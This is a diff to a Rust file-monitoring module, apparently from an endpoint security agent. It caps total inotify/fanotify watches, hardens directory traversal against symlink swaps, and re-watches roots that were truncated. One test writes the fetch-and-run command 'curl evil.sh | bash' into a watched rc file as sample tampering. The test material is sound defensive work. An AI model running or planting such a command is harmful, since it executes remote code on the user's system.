@@ -24,7 +24,7 @@
 
 use std::collections::{HashMap, HashSet};
 use std::io;
-use std::os::unix::io::RawFd;
+use std::os::fd::{AsRawFd, FromRawFd, OwnedFd, RawFd};
 use std::time::{Duration, Instant, SystemTime, UNIX_EPOCH};
 
 use crate::pb::AgentEvent;
@@ -69,9 +69,14 @@ const RC_FILES: &[&str] = &[".bashrc", ".bash_profile", ".profile"];
 /// 全局 shell rc 文件（/etc 递归已覆盖，仅在其未被目录清单兜住时才单挂）。
 const GLOBAL_RC_FILES: &[&str] = &["/etc/profile", "/etc/bash.bashrc"];
 
-/// inotify 事件掩码：建/改/属性/删/移入
-const EVENT_MASK: u32 =
-    libc::IN_CREATE | libc::IN_MODIFY | libc::IN_ATTRIB | libc::IN_DELETE | libc::IN_MOVED_TO;
+/// inotify 事件掩码：建/改/属性/删/移入；附加 IN_ONLYDIR | IN_DONT_FOLLOW 原子拒绝符号链接替换
+const EVENT_MASK: u32 = libc::IN_CREATE
+    | libc::IN_MODIFY
+    | libc::IN_ATTRIB
+    | libc::IN_DELETE
+    | libc::IN_MOVED_TO
+    | libc::IN_ONLYDIR
+    | libc::IN_DONT_FOLLOW;
 
 /// 单文件目标的事件掩码：改/属性/本体删除/本体移出。
 /// 目录的 IN_DELETE/IN_MOVED_TO 报的是子项，文件本体被删或被改名覆盖
@@ -81,7 +86,8 @@ const FILE_EVENT_MASK: u32 =
 
 /// 用户家目录父级监控掩码（inotify）：只盯子项创建与移入，用来即时发现启动后新建的 `.ssh`，
 /// 不订阅普通文件修改/属性/删除，避免家目录常规读写唤醒采集器。
-const PARENT_DIR_MASK: u32 = libc::IN_CREATE | libc::IN_MOVED_TO | libc::IN_ONLYDIR;
+const PARENT_DIR_MASK: u32 =
+    libc::IN_CREATE | libc::IN_MOVED_TO | libc::IN_ONLYDIR | libc::IN_DONT_FOLLOW;
 
 /// fanotify_init 标志：FID + 目录 FID + 名字报告，事件才能还原完整路径
 const FA_INIT_FLAGS: u32 = libc::FAN_CLASS_NOTIF
@@ -164,13 +170,21 @@ fn start(agent_id: &str, sink: &EventSink, targets: &[String]) -> io::Result<(Wo
         }
         Err(e) => {
             eprintln!("fanotify 不可用（{e}），回落 inotify 递归监控");
-            let (fd, watched) = ino_init(targets)
+            let (fd, watched, truncated_roots) = ino_init(targets)
                 .inspect_err(|_| sink.capability("files", "inotify", "unavailable"))?;
             let n = watched.len();
             sink.capability("files", "inotify", "degraded");
             let targets = targets.to_vec();
             let worker = Worker::spawn(move |stop| {
-                ino_run(fd, watched, targets, &agent_id, &sink, stop);
+                ino_run(
+                    fd,
+                    watched,
+                    truncated_roots,
+                    targets,
+                    &agent_id,
+                    &sink,
+                    stop,
+                );
                 if !stop.requested() {
                     sink.capability("files", "inotify", "unavailable");
                 }
@@ -265,42 +279,106 @@ fn covered_by_dirs(path: &str, targets: &[String]) -> bool {
     rel_depth(targets, path).is_some_and(|d| d <= MAX_DEPTH)
 }
 
-/// 单个监控根递归收集子目录的总数上限，防止恶意构造深宽目录树打爆 inotify watch 上限或内存。
-const MAX_SUBDIRS: usize = 4096;
+/// 全局 watch / mark 总预算上限，所有监控根与动态补挂目录共享，防打爆 inotify/fanotify 上限或内存。
+const MAX_TOTAL_WATCHES: usize = 4096;
 
-/// 收集 root 及其子目录（含 root，root 深度为 0），最深 max_depth 层。
-/// root 不存在时返回 [root]，由后续挂 watch/mark 失败来跳过。
-fn collect_subdirs(root: &str, max_depth: usize) -> Vec<String> {
-    collect_subdirs_limited(root, max_depth, MAX_SUBDIRS)
+/// 以 `O_RDONLY | O_DIRECTORY | O_NOFOLLOW | O_CLOEXEC` 打开真实目录，原子拒绝符号链接与非目录。
+fn open_dir_nofollow(path: &str) -> io::Result<OwnedFd> {
+    let c = std::ffi::CString::new(path)
+        .map_err(|_| io::Error::new(io::ErrorKind::InvalidInput, "目录路径含 NUL 字节"))?;
+    let flags = libc::O_RDONLY | libc::O_DIRECTORY | libc::O_NOFOLLOW | libc::O_CLOEXEC;
+    // SAFETY: c 是调用期间存活的 NUL 结尾 CString；返回值 < 0 时立刻返回错误，成功时交给 OwnedFd 独占关闭。
+    let fd = unsafe { libc::open(c.as_ptr(), flags) };
+    if fd < 0 {
+        return Err(io::Error::last_os_error());
+    }
+    // SAFETY: fd >= 0 是刚打开的新目录描述符，此处之外无人持有。
+    Ok(unsafe { OwnedFd::from_raw_fd(fd) })
 }
 
-fn collect_subdirs_limited(root: &str, max_depth: usize, max_dirs: usize) -> Vec<String> {
-    if max_dirs == 0 {
-        return Vec::new();
+/// 收集 root 及其子目录（含 root，root 深度为 0），最深 max_depth 层，最多收集 `remaining` 个新目录。
+/// 返回 `(待新增的目录列表, 是否因预算不足被截断)`。
+/// `already_watched` 为 true 的目录只递归遍历其子目录，不重复计入 `remaining` 预算，以便截断后补挂。
+fn collect_subdirs_filtered(
+    root: &str,
+    max_depth: usize,
+    remaining: usize,
+    mut already_watched: impl FnMut(&str) -> bool,
+) -> (Vec<String>, bool) {
+    let root_clean = root.trim_end_matches('/');
+    let root_path = if root_clean.is_empty() {
+        "/"
+    } else {
+        root_clean
+    };
+    // 先原子确认 root 本身是真实目录（拒绝软链与不存在路径）
+    if open_dir_nofollow(root_path).is_err() {
+        return (Vec::new(), false);
     }
+
     let mut out = Vec::new();
-    let mut stack = vec![(root.trim_end_matches('/').to_string(), 0usize)];
+    let mut truncated = false;
+    let mut stack = vec![(root_path.to_string(), 0usize)];
     while let Some((dir, depth)) = stack.pop() {
-        if out.len() >= max_dirs {
-            break;
+        let Ok(dir_fd) = open_dir_nofollow(&dir) else {
+            continue;
+        };
+        if !already_watched(&dir) {
+            if out.len() >= remaining {
+                truncated = true;
+                continue;
+            }
+            out.push(dir.clone());
         }
-        out.push(dir.clone());
-        if depth >= max_depth || out.len() >= max_dirs {
+        if depth >= max_depth {
             continue;
         }
-        if let Ok(rd) = std::fs::read_dir(&dir) {
+        // 通过已打开的真实目录 fd 枚举子项，防路径在检查与读取之间被替换为软链
+        let fd_path = format!("/proc/self/fd/{}", dir_fd.as_raw_fd());
+        if let Ok(rd) = std::fs::read_dir(&fd_path) {
             for e in rd.flatten() {
-                // DirEntry::file_type 在 Unix/Windows 上均不跟随符号链接，防软链逃逸或环路
+                // DirEntry::file_type 不跟随符号链接，防软链逃逸或环路
                 if e.file_type().is_ok_and(|t| t.is_dir()) {
-                    if out.len() + stack.len() >= max_dirs {
-                        break;
+                    let Some(name) = e.file_name().into_string().ok() else {
+                        continue;
+                    };
+                    let child = if dir == "/" {
+                        format!("/{name}")
+                    } else {
+                        format!("{dir}/{name}")
+                    };
+                    if out.len() >= remaining && !already_watched(&child) {
+                        truncated = true;
+                        continue;
                     }
-                    stack.push((e.path().to_string_lossy().into_owned(), depth + 1));
+                    stack.push((child, depth + 1));
                 }
             }
         }
     }
-    out
+    (out, truncated)
+}
+
+#[cfg(test)]
+fn collect_subdirs(root: &str, max_depth: usize, max_dirs: usize) -> (Vec<String>, bool) {
+    collect_subdirs_filtered(root, max_depth, max_dirs, |_| false)
+}
+
+/// 定位 path 所属的最浅监控根，用于在动态子目录触发预算截断时标记对应根以便后续补挂。
+fn owning_root<'a>(roots: &'a [String], path: &str) -> Option<&'a str> {
+    let path = path.trim_end_matches('/');
+    roots
+        .iter()
+        .map(String::as_str)
+        .filter(|root| {
+            let root = root.trim_end_matches('/');
+            !root.is_empty()
+                && (path == root
+                    || path
+                        .strip_prefix(root)
+                        .is_some_and(|rest| rest.starts_with('/')))
+        })
+        .min_by_key(|root| root.len())
 }
 
 /// path 相对各监控根的深度（取最浅；等于目标根本身为 0），不在任何根下返回 None。
@@ -336,42 +414,66 @@ struct WatchEntry {
     parent_only: bool,
 }
 
-/// 初始化 inotify：目录目标递归挂 watch（限深），单文件目标直接挂文件本体，
-/// `.ssh` 的父目录（用户家目录）挂轻量目录创建 watch。返回 (fd, wd -> 监控表项)。
-fn ino_init(targets: &[String]) -> io::Result<(RawFd, HashMap<i32, WatchEntry>)> {
+/// 初始化 inotify：目录目标递归挂 watch（限深且受全局总预算约束），单文件目标直接挂文件本体，
+/// `.ssh` 的父目录（用户家目录）挂轻量目录创建 watch。返回 (fd, wd -> 监控表项, 发生过截断的根集合)。
+fn ino_init(targets: &[String]) -> io::Result<(RawFd, HashMap<i32, WatchEntry>, HashSet<String>)> {
+    ino_init_with_budget(targets, MAX_TOTAL_WATCHES)
+}
+
+fn ino_init_with_budget(
+    targets: &[String],
+    budget: usize,
+) -> io::Result<(RawFd, HashMap<i32, WatchEntry>, HashSet<String>)> {
     // SAFETY: 纯 FFI 调用，只传整数标志，不涉及指针；返回值在下面检查 < 0。
     let fd = unsafe { libc::inotify_init1(libc::IN_CLOEXEC) };
     if fd < 0 {
         return Err(io::Error::last_os_error());
     }
     let mut watched = HashMap::new();
+    let mut truncated_roots = HashSet::new();
     for root in targets {
         if std::path::Path::new(root).is_file() {
-            ino_add_file(fd, root, &mut watched);
+            ino_add_file(fd, root, budget, &mut watched);
         } else {
-            ino_add_tree(fd, root, MAX_DEPTH, &mut watched);
+            let (_, truncated) = ino_add_tree(fd, root, MAX_DEPTH, budget, &mut watched);
+            if truncated {
+                eprintln!(
+                    "文件监控: inotify 监控数触及总预算（{budget}），{root} 存在未挂全的子目录，将在有余量时补挂"
+                );
+                truncated_roots.insert(root.clone());
+            }
         }
     }
     for parent in ssh_parent_dirs(targets) {
-        ino_add_parent(fd, &parent, &mut watched);
+        ino_add_parent(fd, &parent, budget, &mut watched);
     }
     if watched.is_empty() {
         // SAFETY: fd 是上面 inotify_init1 刚返回的有效 fd，尚未交给任何人，出错返回前关掉，之后不再使用。
         unsafe { libc::close(fd) };
         return Err(io::Error::new(io::ErrorKind::NotFound, "没有可监控的目标"));
     }
-    Ok((fd, watched))
+    Ok((fd, watched, truncated_roots))
 }
 
-/// 给 root 及其限深内的子目录全部挂上 watch，返回这次新挂上的目录。
+/// 给 root 及其限深内的子目录挂上 watch（受全局总预算 `budget` 约束），
+/// 返回 `(这次新挂上的目录, 是否因预算不足被截断)`。
 fn ino_add_tree(
     fd: RawFd,
     root: &str,
     max_depth: usize,
+    budget: usize,
     watched: &mut HashMap<i32, WatchEntry>,
-) -> Vec<String> {
+) -> (Vec<String>, bool) {
+    let existing: HashSet<String> = watched
+        .values()
+        .filter(|e| !e.parent_only && !e.is_file)
+        .map(|e| e.path.clone())
+        .collect();
+    let remaining = budget.saturating_sub(watched.len());
+    let (dirs, truncated) =
+        collect_subdirs_filtered(root, max_depth, remaining, |p| existing.contains(p));
     let mut fresh = Vec::new();
-    for dir in collect_subdirs(root, max_depth) {
+    for dir in dirs {
         let Ok(c) = std::ffi::CString::new(dir.as_str()) else {
             continue;
         };
@@ -389,12 +491,12 @@ fn ino_add_tree(
             );
         }
     }
-    fresh
+    (fresh, truncated)
 }
 
 /// 给 `.ssh` 的父目录（用户家目录）挂轻量 watch，仅发现子目录新建/移入。
-fn ino_add_parent(fd: RawFd, dir: &str, watched: &mut HashMap<i32, WatchEntry>) {
-    if watched.values().any(|entry| entry.path == dir) {
+fn ino_add_parent(fd: RawFd, dir: &str, budget: usize, watched: &mut HashMap<i32, WatchEntry>) {
+    if watched.len() >= budget || watched.values().any(|entry| entry.path == dir) {
         return;
     }
     let Ok(c) = std::ffi::CString::new(dir) else {
@@ -415,7 +517,10 @@ fn ino_add_parent(fd: RawFd, dir: &str, watched: &mut HashMap<i32, WatchEntry>) 
 }
 
 /// 给单个文件挂 watch（shell rc 等单文件目标）。
-fn ino_add_file(fd: RawFd, path: &str, watched: &mut HashMap<i32, WatchEntry>) {
+fn ino_add_file(fd: RawFd, path: &str, budget: usize, watched: &mut HashMap<i32, WatchEntry>) {
+    if watched.len() >= budget && !watched.values().any(|e| e.is_file && e.path == path) {
+        return;
+    }
     let Ok(c) = std::ffi::CString::new(path) else {
         return;
     };
@@ -436,6 +541,7 @@ fn ino_add_file(fd: RawFd, path: &str, watched: &mut HashMap<i32, WatchEntry>) {
 fn ino_run(
     fd: RawFd,
     mut watched: HashMap<i32, WatchEntry>,
+    mut truncated_roots: HashSet<String>,
     roots: Vec<String>,
     agent_id: &str,
     sink: &EventSink,
@@ -466,7 +572,13 @@ fn ino_run(
             return;
         }
         if last_rescan.elapsed() >= TARGET_RESCAN_INTERVAL {
-            let fresh = ino_reconcile(fd, &roots, &mut watched);
+            let fresh = ino_reconcile(
+                fd,
+                &roots,
+                &mut watched,
+                &mut truncated_roots,
+                MAX_TOTAL_WATCHES,
+            );
             last_rescan = Instant::now();
             if !backfill(&fresh, agent_id, sink) {
                 // SAFETY: 同上：关闭独占的 fd 后立即 return。
@@ -515,7 +627,7 @@ fn ino_run(
                     && entry.is_file
                     && std::path::Path::new(&entry.path).is_file()
                 {
-                    ino_add_file(fd, &entry.path, &mut watched);
+                    ino_add_file(fd, &entry.path, MAX_TOTAL_WATCHES, &mut watched);
                 }
                 continue;
             }
@@ -545,7 +657,16 @@ fn ino_run(
                     && d <= MAX_DEPTH
                 {
                     super::sshkeys::notify_if_relevant(&path);
-                    let fresh = ino_add_tree(fd, &path, MAX_DEPTH - d, &mut watched);
+                    let (fresh, truncated) =
+                        ino_add_tree(fd, &path, MAX_DEPTH - d, MAX_TOTAL_WATCHES, &mut watched);
+                    if truncated
+                        && let Some(owner) = owning_root(&roots, &path)
+                        && truncated_roots.insert(owner.to_string())
+                    {
+                        eprintln!(
+                            "文件监控: 动态补挂 {path} 触及总预算（{MAX_TOTAL_WATCHES}），已标记 {owner} 待余量补挂"
+                        );
+                    }
                     if !backfill(&fresh, agent_id, sink) {
                         // SAFETY: 同上：关闭独占的 fd 后立即 return。
                         unsafe { libc::close(fd) };
@@ -569,29 +690,39 @@ fn ino_run(
     }
 }
 
-/// 给启动时不存在、删除后重建的目标根补挂 watch，返回新挂上的目录。已存在的根不重复添加，
-/// 子目录仍由事件驱动的动态补挂负责。
+/// 给启动时不存在、删除后重建、或之前因预算满而截断的目标根补挂 watch，返回新挂上的目录。
+/// 未截断且已存在的根不重复扫描；截断过的根在有余量时会继续补挂，完整挂齐后清除截断标记。
 fn ino_reconcile(
     fd: RawFd,
     roots: &[String],
     watched: &mut HashMap<i32, WatchEntry>,
+    truncated_roots: &mut HashSet<String>,
+    budget: usize,
 ) -> Vec<String> {
     let mut fresh = Vec::new();
     for root in roots {
-        if watched
+        let was_truncated = truncated_roots.contains(root);
+        let root_watched = watched
             .values()
-            .any(|entry| !entry.parent_only && entry.path == *root)
-        {
+            .any(|entry| !entry.parent_only && entry.path == *root);
+        if root_watched && !was_truncated {
             continue;
         }
         if std::path::Path::new(root).is_file() {
-            ino_add_file(fd, root, watched);
-        } else if std::path::Path::new(root).is_dir() {
-            fresh.extend(ino_add_tree(fd, root, MAX_DEPTH, watched));
+            ino_add_file(fd, root, budget, watched);
+            truncated_roots.remove(root);
+        } else if open_dir_nofollow(root).is_ok() {
+            let (added, truncated) = ino_add_tree(fd, root, MAX_DEPTH, budget, watched);
+            fresh.extend(added);
+            if truncated {
+                truncated_roots.insert(root.clone());
+            } else {
+                truncated_roots.remove(root);
+            }
         }
     }
     for parent in ssh_parent_dirs(roots) {
-        ino_add_parent(fd, &parent, watched);
+        ino_add_parent(fd, &parent, budget, watched);
     }
     fresh
 }
@@ -607,18 +738,19 @@ fn ino_activity(mask: u32) -> u8 {
 
 // ---------------- fanotify 路径（优先，带进程上下文） ----------------
 
-/// fanotify 运行状态：事件 fd、监控根（算深度用）、fsid -> 挂载点 fd 缓存。
+/// fanotify 运行状态：事件 fd、监控根（算深度用）、fsid -> 挂载点 fd 缓存、截断根集合。
 struct FaState {
     fd: RawFd,
     roots: Vec<String>,
     marked: HashSet<String>,
     parent_marked: HashSet<String>,
+    truncated_roots: HashSet<String>,
     mounts: HashMap<(i32, i32), RawFd>,
     warned_overflow: bool,
     warned_resolve: bool,
 }
 
-/// 初始化 fanotify：目录目标递归打标（限深），单文件目标直接打在文件上，
+/// 初始化 fanotify：目录目标递归打标（限深且受全局总预算约束），单文件目标直接打在文件上，
 /// `.ssh` 的父目录（用户家目录）打轻量目录创建标。
 /// 需要 CAP_SYS_ADMIN；内核 < 5.9 不支持 FAN_REPORT_NAME 会在 fanotify_init
 /// 直接 EINVAL。任何失败都由调用方回落 inotify。
@@ -632,15 +764,30 @@ fn fa_setup(targets: &[String]) -> io::Result<(FaState, usize)> {
     let mut n = 0;
     let mut marked = HashSet::new();
     let mut parent_marked = HashSet::new();
+    let mut truncated_roots = HashSet::new();
     for root in targets {
         if std::path::Path::new(root).is_file() {
-            n += fa_mark_file(fd, root, &mut marked);
+            n += fa_mark_file(fd, root, MAX_TOTAL_WATCHES, &mut marked, &parent_marked);
         } else {
-            n += fa_mark_tree(fd, root, MAX_DEPTH, &mut marked).len();
+            let (added, truncated) = fa_mark_tree(
+                fd,
+                root,
+                MAX_DEPTH,
+                MAX_TOTAL_WATCHES,
+                &mut marked,
+                &parent_marked,
+            );
+            n += added.len();
+            if truncated {
+                eprintln!(
+                    "文件监控: fanotify 监控数触及总预算（{MAX_TOTAL_WATCHES}），{root} 存在未打全的子目录，将在有余量时补标"
+                );
+                truncated_roots.insert(root.clone());
+            }
         }
     }
     for parent in ssh_parent_dirs(targets) {
-        n += fa_mark_parent(fd, &parent, &marked, &mut parent_marked);
+        n += fa_mark_parent(fd, &parent, MAX_TOTAL_WATCHES, &marked, &mut parent_marked);
     }
     if n == 0 {
         // SAFETY: fd 是上面 fanotify_init 刚返回的有效 fd，尚未放进 FaState，出错返回前关掉，之后不再使用。
@@ -652,6 +799,7 @@ fn fa_setup(targets: &[String]) -> io::Result<(FaState, usize)> {
         roots: targets.to_vec(),
         marked,
         parent_marked,
+        truncated_roots,
         mounts: HashMap::new(),
         warned_overflow: false,
         warned_resolve: false,
@@ -659,15 +807,21 @@ fn fa_setup(targets: &[String]) -> io::Result<(FaState, usize)> {
     Ok((st, n))
 }
 
-/// 给 root 及其限深内的子目录全部打上 mark，返回这次新打上的目录。
+/// 给 root 及其限深内的子目录打上 mark（受全局总预算 `budget` 约束，并原子拒绝符号链接替换），
+/// 返回 `(这次新打上的目录, 是否因预算不足被截断)`。
 fn fa_mark_tree(
     fd: RawFd,
     root: &str,
     max_depth: usize,
+    budget: usize,
     marked: &mut HashSet<String>,
-) -> Vec<String> {
+    parent_marked: &HashSet<String>,
+) -> (Vec<String>, bool) {
+    let remaining = budget.saturating_sub(marked.len() + parent_marked.len());
+    let (dirs, truncated) =
+        collect_subdirs_filtered(root, max_depth, remaining, |p| marked.contains(p));
     let mut fresh = Vec::new();
-    for dir in collect_subdirs(root, max_depth) {
+    for dir in dirs {
         if marked.contains(&dir) {
             continue;
         }
@@ -675,11 +829,11 @@ fn fa_mark_tree(
             continue;
         };
         // SAFETY: fd 是调用方持有的有效 fanotify fd；c 是 NUL 结尾的 CString，调用期间一直存活；
-        // dirfd 为 AT_FDCWD，路径按当前目录解析，内核只读路径。
+        // dirfd 为 AT_FDCWD，路径按当前目录解析，内核只读路径；FAN_MARK_DONT_FOLLOW 原子拒绝软链替换。
         let rc = unsafe {
             libc::fanotify_mark(
                 fd,
-                libc::FAN_MARK_ADD | libc::FAN_MARK_ONLYDIR,
+                libc::FAN_MARK_ADD | libc::FAN_MARK_ONLYDIR | libc::FAN_MARK_DONT_FOLLOW,
                 FA_MARK_MASK,
                 libc::AT_FDCWD,
                 c.as_ptr(),
@@ -690,15 +844,21 @@ fn fa_mark_tree(
             fresh.push(dir);
         }
     }
-    fresh
+    (fresh, truncated)
 }
 
 /// 给单个文件打 mark（shell rc 等单文件目标），成功返回 1。
 /// 不加 FAN_MARK_ONLYDIR（那会把文件目标直接拒掉），也不带
 /// FAN_EVENT_ON_CHILD——文件没有子项，事件本来就落在本体上。
 /// 文件被删后内核自动摘 mark，删除事件本身能收到，周期补扫会为重建文件补标。
-fn fa_mark_file(fd: RawFd, path: &str, marked: &mut HashSet<String>) -> usize {
-    if marked.contains(path) {
+fn fa_mark_file(
+    fd: RawFd,
+    path: &str,
+    budget: usize,
+    marked: &mut HashSet<String>,
+    parent_marked: &HashSet<String>,
+) -> usize {
+    if marked.contains(path) || marked.len() + parent_marked.len() >= budget {
         return 0;
     }
     let Ok(c) = std::ffi::CString::new(path) else {
@@ -726,10 +886,14 @@ fn fa_mark_file(fd: RawFd, path: &str, marked: &mut HashSet<String>) -> usize {
 fn fa_mark_parent(
     fd: RawFd,
     dir: &str,
+    budget: usize,
     marked: &HashSet<String>,
     parent_marked: &mut HashSet<String>,
 ) -> usize {
-    if marked.contains(dir) || parent_marked.contains(dir) {
+    if marked.contains(dir)
+        || parent_marked.contains(dir)
+        || marked.len() + parent_marked.len() >= budget
+    {
         return 0;
     }
     let Ok(c) = std::ffi::CString::new(dir) else {
@@ -739,7 +903,7 @@ fn fa_mark_parent(
     let rc = unsafe {
         libc::fanotify_mark(
             fd,
-            libc::FAN_MARK_ADD | libc::FAN_MARK_ONLYDIR,
+            libc::FAN_MARK_ADD | libc::FAN_MARK_ONLYDIR | libc::FAN_MARK_DONT_FOLLOW,
             FA_PARENT_MARK_MASK,
             libc::AT_FDCWD,
             c.as_ptr(),
@@ -753,21 +917,52 @@ fn fa_mark_parent(
     }
 }
 
-/// 补标消失又出现的目标，返回新打上 mark 的目录。
+/// 补标消失又出现的目标以及此前因总预算满而截断的根，返回新打上 mark 的目录。
 fn fa_reconcile(st: &mut FaState) -> Vec<String> {
     st.marked.retain(|path| std::path::Path::new(path).exists());
     st.parent_marked
         .retain(|path| std::path::Path::new(path).exists());
     let mut fresh = Vec::new();
     for root in st.roots.clone() {
+        let was_truncated = st.truncated_roots.contains(&root);
+        let root_marked = st.marked.contains(&root);
+        if root_marked && !was_truncated {
+            continue;
+        }
         if std::path::Path::new(&root).is_file() {
-            fa_mark_file(st.fd, &root, &mut st.marked);
-        } else if std::path::Path::new(&root).is_dir() {
-            fresh.extend(fa_mark_tree(st.fd, &root, MAX_DEPTH, &mut st.marked));
+            fa_mark_file(
+                st.fd,
+                &root,
+                MAX_TOTAL_WATCHES,
+                &mut st.marked,
+                &st.parent_marked,
+            );
+            st.truncated_roots.remove(&root);
+        } else if open_dir_nofollow(&root).is_ok() {
+            let (added, truncated) = fa_mark_tree(
+                st.fd,
+                &root,
+                MAX_DEPTH,
+                MAX_TOTAL_WATCHES,
+                &mut st.marked,
+                &st.parent_marked,
+            );
+            fresh.extend(added);
+            if truncated {
+                st.truncated_roots.insert(root);
+            } else {
+                st.truncated_roots.remove(&root);
+            }
         }
     }
     for parent in ssh_parent_dirs(&st.roots) {
-        fa_mark_parent(st.fd, &parent, &st.marked, &mut st.parent_marked);
+        fa_mark_parent(
+            st.fd,
+            &parent,
+            MAX_TOTAL_WATCHES,
+            &st.marked,
+            &mut st.parent_marked,
+        );
     }
     fresh
 }
@@ -1030,14 +1225,29 @@ fn fa_run(mut st: FaState, agent_id: &str, sink: &EventSink, stop: &Stop) {
                 }
                 continue;
             };
-            // 新建/移入的子目录（含家目录下新建的 .ssh 目标根）动态补打 mark（受深度限制）
+            // 新建/移入的子目录（含家目录下新建的 .ssh 目标根）动态补打 mark（受深度与总预算限制）
             if ev.mask & libc::FAN_ONDIR != 0
                 && ev.mask & (libc::FAN_CREATE | libc::FAN_MOVED_TO) != 0
                 && let Some(d) = rel_depth(&st.roots, &path)
                 && d <= MAX_DEPTH
             {
                 super::sshkeys::notify_if_relevant(&path);
-                let fresh = fa_mark_tree(st.fd, &path, MAX_DEPTH - d, &mut st.marked);
+                let (fresh, truncated) = fa_mark_tree(
+                    st.fd,
+                    &path,
+                    MAX_DEPTH - d,
+                    MAX_TOTAL_WATCHES,
+                    &mut st.marked,
+                    &st.parent_marked,
+                );
+                if truncated
+                    && let Some(owner) = owning_root(&st.roots, &path)
+                    && st.truncated_roots.insert(owner.to_string())
+                {
+                    eprintln!(
+                        "文件监控: fanotify 动态补标 {path} 触及总预算（{MAX_TOTAL_WATCHES}），已标记 {owner} 待余量补标"
+                    );
+                }
                 if !backfill(&fresh, agent_id, sink) {
                     fa_close(st);
                     return;
@@ -1198,10 +1408,18 @@ mod tests {
         std::fs::create_dir(&dir).unwrap();
         let dir_s = dir.to_str().unwrap().to_string();
 
-        let (fd, watched) = ino_init(std::slice::from_ref(&dir_s)).unwrap();
+        let (fd, watched, truncated) = ino_init(std::slice::from_ref(&dir_s)).unwrap();
         let (sink, mut rx) = test_sink();
         std::thread::spawn(move || {
-            ino_run(fd, watched, vec![dir_s], "agent-t", &sink, &Stop::default())
+            ino_run(
+                fd,
+                watched,
+                truncated,
+                vec![dir_s],
+                "agent-t",
+                &sink,
+                &Stop::default(),
+            )
         });
 
         std::fs::write(dir.join("evil.txt"), b"x").unwrap();
@@ -1240,9 +1458,11 @@ mod tests {
         let targets = vec![dir.to_str().unwrap().to_string()];
         let (sink, mut rx) = test_sink();
         let start = || {
-            let (fd, watched) = ino_init(&targets).unwrap();
+            let (fd, watched, truncated) = ino_init(&targets).unwrap();
             let (targets, sink) = (targets.clone(), sink.clone());
-            Worker::spawn(move |stop| ino_run(fd, watched, targets, "agent-t", &sink, stop))
+            Worker::spawn(move |stop| {
+                ino_run(fd, watched, truncated, targets, "agent-t", &sink, stop)
+            })
         };
 
         let first = start();
@@ -1277,10 +1497,18 @@ mod tests {
         std::fs::create_dir(&dir).unwrap();
         let dir_s = dir.to_str().unwrap().to_string();
 
-        let (fd, watched) = ino_init(std::slice::from_ref(&dir_s)).unwrap();
+        let (fd, watched, truncated) = ino_init(std::slice::from_ref(&dir_s)).unwrap();
         let (sink, mut rx) = test_sink();
         std::thread::spawn(move || {
-            ino_run(fd, watched, vec![dir_s], "agent-t", &sink, &Stop::default())
+            ino_run(
+                fd,
+                watched,
+                truncated,
+                vec![dir_s],
+                "agent-t",
+                &sink,
+                &Stop::default(),
+            )
         });
 
         // 运行中新建的子目录应被动态补挂；稍等事件循环处理完再写文件
@@ -1311,10 +1539,18 @@ mod tests {
             late.to_string_lossy().into_owned(),
         ];
 
-        let (fd, watched) = ino_init(&targets).unwrap();
+        let (fd, watched, truncated) = ino_init(&targets).unwrap();
         let (sink, mut rx) = test_sink();
         std::thread::spawn(move || {
-            ino_run(fd, watched, targets, "agent-t", &sink, &Stop::default())
+            ino_run(
+                fd,
+                watched,
+                truncated,
+                targets,
+                "agent-t",
+                &sink,
+                &Stop::default(),
+            )
         });
 
         std::fs::create_dir(&late).unwrap();
@@ -1341,10 +1577,18 @@ mod tests {
             late.to_string_lossy().into_owned(),
         ];
 
-        let (fd, watched) = ino_init(&targets).unwrap();
+        let (fd, watched, truncated) = ino_init(&targets).unwrap();
         let (sink, mut rx) = test_sink();
         std::thread::spawn(move || {
-            ino_run(fd, watched, targets, "agent-t", &sink, &Stop::default())
+            ino_run(
+                fd,
+                watched,
+                truncated,
+                targets,
+                "agent-t",
+                &sink,
+                &Stop::default(),
+            )
         });
 
         std::fs::create_dir(&late).unwrap();
@@ -1372,11 +1616,16 @@ mod tests {
         std::fs::create_dir_all(dir.join("a/b/c/d/e")).unwrap();
 
         let root = dir.to_str().unwrap();
-        let shallow = collect_subdirs(root, 2);
+        let (shallow, trunc_shallow) = collect_subdirs(root, 2, MAX_TOTAL_WATCHES);
         assert_eq!(shallow.len(), 3, "限深 2 层只应收 root、a、a/b");
-        let full = collect_subdirs(root, 99);
+        assert!(!trunc_shallow);
+        let (full, trunc_full) = collect_subdirs(root, 99, MAX_TOTAL_WATCHES);
         assert_eq!(full.len(), 6, "全深度应收齐 6 层目录");
-        assert_eq!(collect_subdirs("/nonexistent/openxdr", 4).len(), 1);
+        assert!(!trunc_full);
+        let (missing, trunc_missing) =
+            collect_subdirs("/nonexistent/openxdr", 4, MAX_TOTAL_WATCHES);
+        assert!(missing.is_empty());
+        assert!(!trunc_missing);
 
         let _ = std::fs::remove_dir_all(&dir);
     }
@@ -1406,10 +1655,18 @@ mod tests {
             vec![alice_home.to_string_lossy().into_owned()]
         );
 
-        let (fd, watched) = ino_init(&targets).unwrap();
+        let (fd, watched, truncated) = ino_init(&targets).unwrap();
         let (sink, mut rx) = test_sink();
         std::thread::spawn(move || {
-            ino_run(fd, watched, targets, "agent-t", &sink, &Stop::default())
+            ino_run(
+                fd,
+                watched,
+                truncated,
+                targets,
+                "agent-t",
+                &sink,
+                &Stop::default(),
+            )
         });
 
         // 家目录下普通文件与无关子目录不应产生监控噪音
@@ -1537,10 +1794,20 @@ mod tests {
         std::fs::write(&file, b"x").unwrap();
         let file_s = file.to_str().unwrap().to_string();
 
-        let (fd, watched) = ino_init(std::slice::from_ref(&file_s)).unwrap();
+        let (fd, watched, truncated) = ino_init(std::slice::from_ref(&file_s)).unwrap();
         let (sink, mut rx) = test_sink();
         let roots = vec![file_s.clone()];
-        std::thread::spawn(move || ino_run(fd, watched, roots, "agent-t", &sink, &Stop::default()));
+        std::thread::spawn(move || {
+            ino_run(
+                fd,
+                watched,
+                truncated,
+                roots,
+                "agent-t",
+                &sink,
+                &Stop::default(),
+            )
+        });
 
         std::fs::write(&file, b"curl evil.sh | bash").unwrap();
 
@@ -1699,7 +1966,9 @@ mod tests {
         std::os::unix::fs::symlink(&outside, root.join("link_out")).unwrap();
         std::os::unix::fs::symlink(&root, root.join("link_loop")).unwrap();
 
-        let found = collect_subdirs(&root.to_string_lossy(), 4);
+        let (found, truncated_normal) =
+            collect_subdirs(&root.to_string_lossy(), 4, MAX_TOTAL_WATCHES);
+        assert!(!truncated_normal);
         assert!(
             found.iter().any(|p| p.ends_with("/real/sub")),
             "真实子目录应被收集：{found:?}"
@@ -1711,13 +1980,58 @@ mod tests {
             "符号链接目录不得被遍历：{found:?}"
         );
 
